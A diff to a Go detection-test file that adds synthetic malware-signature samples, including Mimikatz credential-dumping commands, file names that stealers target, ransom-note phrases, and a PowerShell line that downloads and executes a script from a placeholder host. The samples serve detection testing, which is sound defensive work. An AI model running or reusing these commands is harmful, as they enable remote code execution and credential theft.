@@ -79,9 +79,15 @@ func TestDetectionRobustnessEnvelope(t *testing.T) {
 
 	// Synthetic samples, built here so no real malware is involved.
 	mimikatz := []byte("sekurlsa::logonpasswords\nlsadump::sam\nprivilege::debug\nkerberos::tickets\n")
+	lokibot := []byte("pass.txt\nwallet.dat\ncookies.sqlite\nlogins.json\nFileZilla\n")
+	ransom := []byte("your files .locked and .encrypted\nsee how_to_decrypt for restore_files instructions\n")
+	powershell := []byte("powershell -NoProfile -ExecutionPolicy Bypass IEX(New-Object Net.WebClient).DownloadString('http://x/a.ps1')\n")
 	samples := []robustSample{
 		{"wannacry", []byte(wannacrySample), true, false},
 		{"mimikatz", mimikatz, true, true},
+		{"lokibot", lokibot, true, false},
+		{"ransomware", ransom, true, false},
+		{"powershell", powershell, true, false},
 	}
 
 	transforms := robustTransforms()
